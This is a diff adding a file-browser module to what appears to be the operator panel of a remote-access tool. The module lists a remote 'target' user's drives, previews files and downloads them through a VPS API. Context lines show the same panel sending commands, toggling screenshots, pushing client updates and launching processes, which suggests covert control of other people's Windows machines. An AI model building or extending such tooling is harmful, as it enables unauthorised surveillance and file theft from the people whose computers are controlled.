@@ -755,6 +755,646 @@ Start-Process $o`;
         }
     }
 
+    // ═══════════════════════════════════════════════════════════════
+    // FTP FILE BROWSER MODULE
+    // ═══════════════════════════════════════════════════════════════
+
+    const ftpState = {
+        isOpen: false,
+        user: null,
+        currentPath: 'drives',
+        parentPath: null,
+        drives: [],
+        items: [],
+        filteredItems: [],
+        selectedItem: null,
+        isLoading: false,
+        filterQuery: '',
+        previewData: null
+    };
+
+    function formatFileSize(bytes) {
+        if (bytes === 0) return '0 B';
+        if (!bytes || isNaN(bytes)) return '—';
+        const k = 1024;
+        const sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
+        const i = Math.floor(Math.log(bytes) / Math.log(k));
+        return parseFloat((bytes / Math.pow(k, i)).toFixed(i === 0 ? 0 : 1)) + ' ' + sizes[i];
+    }
+
+    function formatFileDate(timestamp) {
+        if (!timestamp) return '—';
+        try {
+            const d = new Date(timestamp * 1000);
+            const pad = n => String(n).padStart(2, '0');
+            return `${d.getFullYear()}-${pad(d.getMonth() + 1)}-${pad(d.getDate())} ${pad(d.getHours())}:${pad(d.getMinutes())}`;
+        } catch {
+            return '—';
+        }
+    }
+
+    function getFileIconClass(item) {
+        if (item.is_dir) return { icon: 'bi-folder-fill', typeClass: 'dir' };
+        const ext = (item.ext || '').toLowerCase();
+        if (['.py', '.js', '.ts', '.json', '.html', '.css', '.ps1', '.bat', '.cmd', '.sh', '.yaml', '.yml', '.xml', '.c', '.cpp', '.h', '.cs', '.rs'].includes(ext)) {
+            return { icon: 'bi-file-earmark-code', typeClass: 'code' };
+        }
+        if (['.png', '.jpg', '.jpeg', '.gif', '.ico', '.webp', '.bmp', '.svg'].includes(ext)) {
+            return { icon: 'bi-file-earmark-image', typeClass: 'media' };
+        }
+        if (['.zip', '.tar', '.gz', '.7z', '.rar', '.bz2'].includes(ext)) {
+            return { icon: 'bi-file-earmark-zip', typeClass: 'binary' };
+        }
+        if (['.exe', '.dll', '.bin', '.iso', '.sys', '.dat'].includes(ext)) {
+            return { icon: 'bi-file-earmark-binary', typeClass: 'binary' };
+        }
+        if (['.txt', '.log', '.md', '.ini', '.cfg', '.conf', '.env'].includes(ext)) {
+            return { icon: 'bi-file-earmark-text', typeClass: 'file' };
+        }
+        return { icon: 'bi-file-earmark', typeClass: 'file' };
+    }
+
+    function escapeHtml(str) {
+        if (!str) return '';
+        return String(str)
+            .replace(/&/g, '&amp;')
+            .replace(/</g, '&lt;')
+            .replace(/>/g, '&gt;')
+            .replace(/"/g, '&quot;')
+            .replace(/'/g, '&#39;');
+    }
+
+    function openFtpBrowser() {
+        const user = runState.popupUser;
+        if (!user) return;
+        ftpState.user = user;
+        ftpState.isOpen = true;
+        ftpState.currentPath = 'drives';
+        ftpState.parentPath = null;
+        ftpState.filterQuery = '';
+        ftpState.previewData = null;
+
+        const targetLabel = $('ftp-target-user');
+        if (targetLabel) targetLabel.textContent = user.username + (user.demo ? ' (Demo Mode)' : '');
+
+        const filterInput = $('ftp-filter-input');
+        if (filterInput) filterInput.value = '';
+        const clearBtn = $('ftp-filter-clear');
+        if (clearBtn) clearBtn.style.display = 'none';
+
+        closeFtpPreview();
+
+        const modal = $('ftp-modal');
+        if (modal) modal.style.display = 'flex';
+
+        loadFtpPath('drives');
+    }
+
+    function closeFtpBrowser() {
+        ftpState.isOpen = false;
+        ftpState.user = null;
+        closeFtpPreview();
+        const modal = $('ftp-modal');
+        if (modal) modal.style.display = 'none';
+    }
+
+    function closeFtpPreview() {
+        ftpState.previewData = null;
+        ftpState.selectedItem = null;
+        const drawer = $('ftp-preview-drawer');
+        if (drawer) drawer.style.display = 'none';
+        document.querySelectorAll('.ftp-file-row.selected').forEach(r => r.classList.remove('selected'));
+    }
+
+    function getDemoFsData(path) {
+        if (!path || path === 'drives' || path === 'Drives') {
+            return {
+                is_drives: true,
+                path: 'Drives',
+                drives: [
+                    { path: 'C:\\', label: 'C: (Local Disk)', total: 536870912000, free: 214748364800 },
+                    { path: 'D:\\', label: 'D: (Secondary Volume)', total: 1073741824000, free: 644245094400 }
+                ],
+                items: []
+            };
+        }
+        const clean = path.replace(/[\\/]+$/, '');
+        const parent = clean.includes('\\') ? clean.substring(0, clean.lastIndexOf('\\')) || clean.substring(0, 3) : 'drives';
+        return {
+            is_drives: false,
+            path: path,
+            parent: clean.endsWith(':') ? 'drives' : (parent || 'drives'),
+            drives: [
+                { path: 'C:\\', label: 'C: (Local Disk)', total: 536870912000, free: 214748364800 },
+                { path: 'D:\\', label: 'D: (Secondary Volume)', total: 1073741824000, free: 644245094400 }
+            ],
+            items: [
+                { name: 'Windows', is_dir: true, size: 0, mtime: 1718000000, ext: '' },
+                { name: 'Program Files', is_dir: true, size: 0, mtime: 1718000000, ext: '' },
+                { name: 'Users', is_dir: true, size: 0, mtime: 1718000000, ext: '' },
+                { name: 'AppData', is_dir: true, size: 0, mtime: 1718000000, ext: '' },
+                { name: 'client_config.json', is_dir: false, size: 1420, mtime: 1719500000, ext: '.json' },
+                { name: 'service_run.log', is_dir: false, size: 28450, mtime: 1719500000, ext: '.log' },
+                { name: 'installer.exe', is_dir: false, size: 12582912, mtime: 1719500000, ext: '.exe' },
+                { name: 'startup.ps1', is_dir: false, size: 850, mtime: 1719500000, ext: '.ps1' },
+                { name: 'README.txt', is_dir: false, size: 520, mtime: 1719500000, ext: '.txt' }
+            ]
+        };
+    }
+
+    async function loadFtpPath(path) {
+        if (ftpState.isLoading) return;
+        ftpState.isLoading = true;
+        closeFtpPreview();
+
+        const listContainer = $('ftp-file-list');
+        if (listContainer) {
+            listContainer.innerHTML = `
+                <div class="ftp-loading-state">
+                    <div class="ftp-spinner"></div>
+                    <span>Loading directory contents...</span>
+                </div>
+            `;
+        }
+
+        const isDemo = !runState.isConnected || ftpState.user?.demo;
+        let data = null;
+
+        if (isDemo) {
+            await new Promise(r => setTimeout(r, 160));
+            data = getDemoFsData(path);
+        } else {
+            try {
+                const res = await fetch(`${VPS_URL}/api/fs/list`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json', 'x-password': runState.password },
+                    body: JSON.stringify({ username: ftpState.user.username, path: path })
+                });
+                if (!res.ok) {
+                    const errPayload = await res.json().catch(() => ({}));
+                    throw new Error(errPayload.error || `HTTP ${res.status}`);
+                }
+                data = await res.json();
+            } catch (err) {
+                ftpState.isLoading = false;
+                renderFtpError(err.message || 'Failed to list directory', path);
+                return;
+            }
+        }
+
+        ftpState.isLoading = false;
+
+        if (data.error && (!data.items || !data.items.length)) {
+            renderFtpError(data.error, data.path || path);
+            return;
+        }
+
+        ftpState.currentPath = data.path || path;
+        ftpState.parentPath = data.parent || (ftpState.currentPath === 'Drives' || ftpState.currentPath === 'drives' ? null : 'drives');
+        if (data.drives) ftpState.drives = data.drives;
+        ftpState.items = data.items || [];
+
+        renderFtpDrivesBar();
+        renderFtpBreadcrumbs();
+        updateFtpParentBtnState();
+
+        if (data.is_drives) {
+            renderFtpDrivesGrid(data.drives || []);
+        } else {
+            renderFtpItemsList();
+        }
+
+        updateFtpStatusBar();
+    }
+
+    function renderFtpError(errMsg, currentPath) {
+        const listContainer = $('ftp-file-list');
+        if (!listContainer) return;
+        listContainer.innerHTML = `
+            <div class="ftp-error-state">
+                <i class="bi bi-exclamation-triangle" style="font-size: 32px;"></i>
+                <div style="font-size: 13px; font-weight: 600;">Unable to open path</div>
+                <div style="font-size: 11.5px; opacity: 0.8; max-width: 380px;">${escapeHtml(errMsg)}</div>
+                <div style="display: flex; gap: 8px; margin-top: 6px;">
+                    <button type="button" class="ftp-drive-chip" id="ftp-err-drives-btn">
+                        <i class="bi bi-hdd-network"></i> Return to Drives
+                    </button>
+                    ${currentPath && currentPath !== 'drives' ? `
+                    <button type="button" class="ftp-drive-chip" id="ftp-err-retry-btn">
+                        <i class="bi bi-arrow-clockwise"></i> Retry
+                    </button>` : ''}
+                </div>
+            </div>
+        `;
+        $('ftp-err-drives-btn')?.addEventListener('click', () => loadFtpPath('drives'));
+        $('ftp-err-retry-btn')?.addEventListener('click', () => loadFtpPath(currentPath));
+        renderFtpBreadcrumbs();
+        updateFtpStatusBar();
+    }
+
+    function renderFtpDrivesBar() {
+        const bar = $('ftp-drives-bar');
+        if (!bar) return;
+        bar.innerHTML = '';
+
+        const allDrivesBtn = document.createElement('button');
+        allDrivesBtn.type = 'button';
+        allDrivesBtn.className = 'ftp-drive-chip' + (ftpState.currentPath === 'drives' || ftpState.currentPath === 'Drives' ? ' active' : '');
+        allDrivesBtn.innerHTML = '<i class="bi bi-hdd-network"></i> Drives';
+        allDrivesBtn.onclick = () => loadFtpPath('drives');
+        bar.appendChild(allDrivesBtn);
+
+        ftpState.drives.forEach(d => {
+            const btn = document.createElement('button');
+            btn.type = 'button';
+            const isActive = ftpState.currentPath.toUpperCase().startsWith(d.path.toUpperCase());
+            btn.className = 'ftp-drive-chip' + (isActive ? ' active' : '');
+            btn.innerHTML = `<i class="bi bi-hdd"></i> ${escapeHtml(d.path)}`;
+            btn.onclick = () => loadFtpPath(d.path);
+            bar.appendChild(btn);
+        });
+    }
+
+    function renderFtpBreadcrumbs() {
+        const container = $('ftp-breadcrumbs');
+        if (!container) return;
+        container.innerHTML = '';
+
+        const isDrives = ftpState.currentPath === 'drives' || ftpState.currentPath === 'Drives';
+
+        const rootCrumb = document.createElement('span');
+        rootCrumb.className = 'ftp-crumb-item' + (isDrives ? ' active' : '');
+        rootCrumb.innerHTML = '<i class="bi bi-hdd-network"></i> Drives';
+        if (!isDrives) {
+            rootCrumb.onclick = () => loadFtpPath('drives');
+        }
+        container.appendChild(rootCrumb);
+
+        if (isDrives) return;
+
+        const path = ftpState.currentPath;
+        const parts = path.split(/[\\/]+/).filter(Boolean);
+
+        let accumulated = '';
+        parts.forEach((part, idx) => {
+            const sep = document.createElement('span');
+            sep.className = 'ftp-crumb-sep';
+            sep.textContent = '/';
+            container.appendChild(sep);
+
+            if (idx === 0 && part.includes(':')) {
+                accumulated = part + '\\';
+            } else if (accumulated.endsWith('\\')) {
+                accumulated += part;
+            } else {
+                accumulated += '\\' + part;
+            }
+
+            const isLast = idx === parts.length - 1;
+            const crumb = document.createElement('span');
+            crumb.className = 'ftp-crumb-item' + (isLast ? ' active' : '');
+            crumb.textContent = part;
+
+            if (!isLast) {
+                const targetPath = accumulated;
+                crumb.onclick = () => loadFtpPath(targetPath);
+            }
+            container.appendChild(crumb);
+        });
+    }
+
+    function updateFtpParentBtnState() {
+        const btn = $('ftp-parent-btn');
+        if (!btn) return;
+        const isDrives = ftpState.currentPath === 'drives' || ftpState.currentPath === 'Drives';
+        btn.disabled = isDrives;
+    }
+
+    function renderFtpDrivesGrid(drives) {
+        const listContainer = $('ftp-file-list');
+        if (!listContainer) return;
+
+        if (!drives || !drives.length) {
+            listContainer.innerHTML = `
+                <div class="ftp-empty-state">
+                    <i class="bi bi-hdd ftp-empty-icon"></i>
+                    <div>No accessible drives detected.</div>
+                </div>
+            `;
+            return;
+        }
+
+        const grid = document.createElement('div');
+        grid.className = 'ftp-drives-grid';
+
+        drives.forEach(d => {
+            const card = document.createElement('div');
+            card.className = 'ftp-drive-card';
+            card.tabIndex = 0;
+
+            const total = d.total || 0;
+            const free = d.free || 0;
+            const used = total > free ? total - free : 0;
+            const pct = total > 0 ? Math.round((used / total) * 100) : 0;
+
+            card.innerHTML = `
+                <div class="ftp-drive-head">
+                    <i class="bi bi-hdd-fill ftp-drive-icon"></i>
+                    <div>
+                        <div class="ftp-drive-title">${escapeHtml(d.path)}</div>
+                        <div class="ftp-drive-sub">${escapeHtml(d.label || 'Local Disk')}</div>
+                    </div>
+                </div>
+                <div class="ftp-drive-bar-wrap">
+                    <div class="ftp-drive-bar-fill" style="width: ${pct}%"></div>
+                </div>
+                <div class="ftp-drive-usage">
+                    <span>${formatFileSize(free)} free</span>
+                    <span>${formatFileSize(total)}</span>
+                </div>
+            `;
+
+            card.onclick = () => loadFtpPath(d.path);
+            card.onkeydown = e => {
+                if (e.key === 'Enter') loadFtpPath(d.path);
+            };
+            grid.appendChild(card);
+        });
+
+        listContainer.innerHTML = '';
+        listContainer.appendChild(grid);
+    }
+
+    function renderFtpItemsList() {
+        const listContainer = $('ftp-file-list');
+        if (!listContainer) return;
+
+        const q = ftpState.filterQuery;
+        const filtered = q
+            ? ftpState.items.filter(it => it.name.toLowerCase().includes(q))
+            : ftpState.items;
+
+        ftpState.filteredItems = filtered;
+
+        if (!filtered.length) {
+            listContainer.innerHTML = `
+                <div class="ftp-empty-state">
+                    <i class="bi bi-folder2-open ftp-empty-icon"></i>
+                    <div>${q ? 'No matching files or folders found.' : 'This directory is empty.'}</div>
+                </div>
+            `;
+            return;
+        }
+
+        listContainer.innerHTML = '';
+
+        filtered.forEach(item => {
+            const row = document.createElement('div');
+            row.className = 'ftp-file-row';
+            row.tabIndex = 0;
+
+            const { icon, typeClass } = getFileIconClass(item);
+            const sizeStr = item.is_dir ? 'Folder' : formatFileSize(item.size);
+            const dateStr = formatFileDate(item.mtime);
+
+            row.innerHTML = `
+                <div class="ftp-row-name">
+                    <i class="bi ${icon} ftp-row-icon ${typeClass}"></i>
+                    <span class="ftp-row-name-text" title="${escapeHtml(item.name)}">${escapeHtml(item.name)}</span>
+                </div>
+                <div class="ftp-row-size">${sizeStr}</div>
+                <div class="ftp-row-date">${dateStr}</div>
+            `;
+
+            row.onclick = () => onFtpRowClick(item, row);
+            row.ondblclick = () => {
+                if (item.is_dir) {
+                    const sep = ftpState.currentPath.endsWith('\\') ? '' : '\\';
+                    loadFtpPath(ftpState.currentPath + sep + item.name);
+                }
+            };
+            row.onkeydown = e => {
+                if (e.key === 'Enter') {
+                    if (item.is_dir) {
+                        const sep = ftpState.currentPath.endsWith('\\') ? '' : '\\';
+                        loadFtpPath(ftpState.currentPath + sep + item.name);
+                    } else {
+                        onFtpRowClick(item, row);
+                    }
+                }
+            };
+
+            listContainer.appendChild(row);
+        });
+    }
+
+    function onFtpRowClick(item, rowEl) {
+        if (item.is_dir) {
+            const sep = ftpState.currentPath.endsWith('\\') ? '' : '\\';
+            loadFtpPath(ftpState.currentPath + sep + item.name);
+            return;
+        }
+
+        document.querySelectorAll('.ftp-file-row.selected').forEach(r => r.classList.remove('selected'));
+        if (rowEl) rowEl.classList.add('selected');
+        ftpState.selectedItem = item;
+
+        const sep = ftpState.currentPath.endsWith('\\') ? '' : '\\';
+        const fullPath = ftpState.currentPath + sep + item.name;
+        openFilePreview(item, fullPath);
+    }
+
+    async function openFilePreview(item, fullPath) {
+        const drawer = $('ftp-preview-drawer');
+        if (!drawer) return;
+        drawer.style.display = 'flex';
+
+        $('ftp-preview-name').textContent = item.name;
+        $('ftp-preview-size').textContent = formatFileSize(item.size);
+
+        const { icon } = getFileIconClass(item);
+        const iconEl = $('ftp-preview-icon');
+        if (iconEl) iconEl.className = `bi ${icon} ftp-preview-icon`;
+
+        const body = $('ftp-preview-body');
+        if (body) {
+            body.innerHTML = `
+                <div class="ftp-loading-state" style="padding: 24px;">
+                    <div class="ftp-spinner"></div>
+                    <span>Reading file contents...</span>
+                </div>
+            `;
+        }
+
+        const isDemo = !runState.isConnected || ftpState.user?.demo;
+        let data = null;
+
+        if (isDemo) {
+            await new Promise(r => setTimeout(r, 120));
+            data = {
+                type: 'text',
+                name: item.name,
+                path: fullPath,
+                size: item.size,
+                content: `// Sample file preview for ${item.name}\n// Path: ${fullPath}\n// Target: ${ftpState.user?.username || 'localhost'}\n\n{\n  "service": "run",\n  "version": "1.0.0",\n  "status": "active",\n  "timestamp": ${Date.now()}\n}`
+            };
+        } else {
+            try {
+                const res = await fetch(`${VPS_URL}/api/fs/read`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json', 'x-password': runState.password },
+                    body: JSON.stringify({ username: ftpState.user.username, path: fullPath })
+                });
+                if (!res.ok) {
+                    const errPayload = await res.json().catch(() => ({}));
+                    throw new Error(errPayload.error || `HTTP ${res.status}`);
+                }
+                data = await res.json();
+            } catch (err) {
+                if (body) {
+                    body.innerHTML = `
+                        <div class="ftp-error-state" style="padding: 20px;">
+                            <i class="bi bi-exclamation-triangle"></i>
+                            <div>Failed to read file preview</div>
+                            <div style="font-size: 11px; opacity: 0.8;">${escapeHtml(err.message)}</div>
+                        </div>
+                    `;
+                }
+                return;
+            }
+        }
+
+        if (data.error) {
+            if (body) {
+                body.innerHTML = `
+                    <div class="ftp-error-state" style="padding: 20px;">
+                        <i class="bi bi-shield-exclamation"></i>
+                        <div>${escapeHtml(data.error)}</div>
+                    </div>
+                `;
+            }
+            return;
+        }
+
+        ftpState.previewData = data;
+
+        if (data.type === 'text') {
+            body.innerHTML = `<pre class="ftp-preview-code"><code>${escapeHtml(data.content)}</code></pre>`;
+        } else if (data.type === 'binary') {
+            const ext = (item.ext || '').toLowerCase();
+            if (['.png', '.jpg', '.jpeg', '.gif', '.ico', '.webp'].includes(ext)) {
+                const mime = ext === '.png' ? 'image/png' : ext === '.gif' ? 'image/gif' : ext === '.webp' ? 'image/webp' : 'image/jpeg';
+                body.innerHTML = `
+                    <div class="ftp-preview-img-wrap">
+                        <img src="data:${mime};base64,${data.content}" class="ftp-preview-img" alt="${escapeHtml(item.name)}">
+                    </div>
+                `;
+            } else {
+                body.innerHTML = `
+                    <div class="ftp-empty-state" style="padding: 24px;">
+                        <i class="bi bi-file-earmark-binary ftp-empty-icon"></i>
+                        <div style="font-size: 12px; font-weight: 600;">Binary File</div>
+                        <div style="font-size: 11px;">Size: ${formatFileSize(data.size)}</div>
+                        <div style="font-size: 10.5px; opacity: 0.7;">Click download button to export this file.</div>
+                    </div>
+                `;
+            }
+        }
+    }
+
+    function copyFtpPreviewContent() {
+        if (!ftpState.previewData) return;
+        const text = ftpState.previewData.content || '';
+        navigator.clipboard.writeText(text).then(() => {
+            const copyBtn = $('ftp-preview-copy');
+            if (copyBtn) {
+                copyBtn.innerHTML = '<i class="bi bi-check2"></i>';
+                setTimeout(() => { copyBtn.innerHTML = '<i class="bi bi-clipboard"></i>'; }, 1500);
+            }
+        }).catch(() => {
+            alert('Failed to copy to clipboard');
+        });
+    }
+
+    function downloadFtpPreviewFile() {
+        if (!ftpState.previewData) return;
+        const data = ftpState.previewData;
+        const filename = data.name || 'download';
+
+        let blob;
+        if (data.type === 'binary') {
+            const byteChars = atob(data.content);
+            const byteNumbers = new Array(byteChars.length);
+            for (let i = 0; i < byteChars.length; i++) {
+                byteNumbers[i] = byteChars.charCodeAt(i);
+            }
+            blob = new Blob([new Uint8Array(byteNumbers)], { type: 'application/octet-stream' });
+        } else {
+            blob = new Blob([data.content], { type: 'text/plain;charset=utf-8' });
+        }
+
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = filename;
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+        setTimeout(() => URL.revokeObjectURL(url), 1000);
+    }
+
+    function updateFtpStatusBar() {
+        const left = $('ftp-status-left');
+        const right = $('ftp-status-path');
+        if (left) {
+            const isDrives = ftpState.currentPath === 'drives' || ftpState.currentPath === 'Drives';
+            if (isDrives) {
+                left.textContent = `${ftpState.drives.length} drive${ftpState.drives.length !== 1 ? 's' : ''}`;
+            } else {
+                const count = ftpState.filteredItems ? ftpState.filteredItems.length : ftpState.items.length;
+                left.textContent = `${count} item${count !== 1 ? 's' : ''}${ftpState.filterQuery ? ' (filtered)' : ''}`;
+            }
+        }
+        if (right) {
+            right.textContent = ftpState.currentPath;
+        }
+    }
+
+    function initFtpBrowser() {
+        $('ftp-close-btn')?.addEventListener('click', closeFtpBrowser);
+        $('ftp-refresh-btn')?.addEventListener('click', () => loadFtpPath(ftpState.currentPath));
+        $('ftp-parent-btn')?.addEventListener('click', () => {
+            if (ftpState.parentPath) loadFtpPath(ftpState.parentPath);
+        });
+        $('ftp-preview-close')?.addEventListener('click', closeFtpPreview);
+        $('ftp-preview-copy')?.addEventListener('click', copyFtpPreviewContent);
+        $('ftp-preview-download')?.addEventListener('click', downloadFtpPreviewFile);
+
+        const filterInput = $('ftp-filter-input');
+        if (filterInput) {
+            filterInput.addEventListener('input', e => {
+                ftpState.filterQuery = e.target.value.toLowerCase().trim();
+                const clearBtn = $('ftp-filter-clear');
+                if (clearBtn) clearBtn.style.display = ftpState.filterQuery ? 'block' : 'none';
+                renderFtpItemsList();
+                updateFtpStatusBar();
+            });
+        }
+
+        $('ftp-filter-clear')?.addEventListener('click', () => {
+            if (filterInput) filterInput.value = '';
+            ftpState.filterQuery = '';
+            $('ftp-filter-clear').style.display = 'none';
+            renderFtpItemsList();
+            updateFtpStatusBar();
+            filterInput?.focus();
+        });
+
+        $('ftp-modal')?.addEventListener('click', e => {
+            if (e.target === $('ftp-modal')) closeFtpBrowser();
+        });
+    }
+
     // ── Send Command / Fetch Data ──
     async function doSendPopup() {
         if (isSendingCommand) return;
@@ -1038,8 +1678,10 @@ Start-Process $o`;
         if ($('vis-false')) $('vis-false').onclick = () => setPopupVisibility(false);
         if ($('upload-btn')) $('upload-btn').onclick = () => $('file-upload')?.click();
         $('update-client-btn')?.addEventListener('click', doSendUpdateClient);
+        $('ftp-browser-btn')?.addEventListener('click', openFtpBrowser);
         $('enable-screenshot-btn')?.addEventListener('click', doToggleEnableScreenshot);
         $('delete-screenshots-btn')?.addEventListener('click', doDeleteAllScreenshots);
+        initFtpBrowser();
 
         const fileUpload = $('file-upload');
         if (fileUpload) {
@@ -1065,6 +1707,31 @@ Start-Process $o`;
 
         // Global keyboard shortcuts
         document.addEventListener('keydown', e => {
+            if (ftpState.isOpen) {
+                if (e.key === 'Escape') {
+                    if ($('ftp-preview-drawer')?.style.display !== 'none') {
+                        closeFtpPreview();
+                    } else {
+                        closeFtpBrowser();
+                    }
+                    return;
+                }
+                const activeTag = document.activeElement?.tagName;
+                if (activeTag === 'INPUT' || activeTag === 'TEXTAREA' || document.activeElement?.isContentEditable) return;
+
+                if (e.key === 'Backspace' && ftpState.parentPath) {
+                    e.preventDefault();
+                    loadFtpPath(ftpState.parentPath);
+                    return;
+                }
+                if (e.key === 'r' || e.key === 'R') {
+                    e.preventDefault();
+                    loadFtpPath(ftpState.currentPath);
+                    return;
+                }
+                return;
+            }
+
             if (!runState.popupMode && window.__getCurrentMode?.() !== 'run') return;
             if (runState.popupMode) {
                 if (e.key === 'Escape') closePopup();
